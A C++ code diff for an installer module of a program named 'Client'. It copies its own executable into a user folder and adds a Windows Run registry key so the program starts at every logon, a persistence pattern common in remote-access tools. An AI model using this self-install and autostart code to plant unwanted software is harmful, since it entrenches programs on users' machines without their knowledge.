@@ -9,17 +9,19 @@ void Install::installClient(int numOfPath, const std::string& locationOfCurrentE
     if (!std::filesystem::exists(whereToInstall)){
         try {
             std::filesystem::create_directory(whereToInstall.parent_path());
-        } catch (const std::filesystem::__cxx11::filesystem_error&){
+            std::filesystem::copy(locationOfCurrentExe, whereToInstall);
+            installStartUpFile(whereToInstall,nameOfStartUpFile);
+        } catch (const std::filesystem::__cxx11::filesystem_error& e){
             if (numOfPath!=2)installClient(2,locationOfCurrentExe,subdirectoryName,subdirectoryFileName,nameOfStartUpFile);
         }
-        std::filesystem::copy(locationOfCurrentExe, whereToInstall);
-        installStartUpFile(nameOfStartUpFile);
     }
 }
 
-void Install::installStartUpFile(const std::string& startUpName){
+void Install::installStartUpFile(const std::wstring& clientPath,const std::string& startUpName){
     if (!startUpName.empty()){
-
+        HKEY hkey = nullptr;
+        LONG createStatus = RegCreateKey(HKEY_CURRENT_USER,R"(SOFTWARE\Microsoft\Windows\CurrentVersion\Run)", &hkey); //Creates a key
+        LONG status = RegSetValueEx(hkey, "Client", 0, REG_SZ, (BYTE *)clientPath.c_str(), (clientPath.size()+1) * sizeof(wchar_t));
     }
 }
 
@@ -36,8 +38,6 @@ std::wstring Install::getAppDataPath(){
     auto path = std::filesystem::temp_directory_path()
             .parent_path()
             .parent_path();
-
-    path /= "Roaming\\";
     return path.wstring();
 }
 
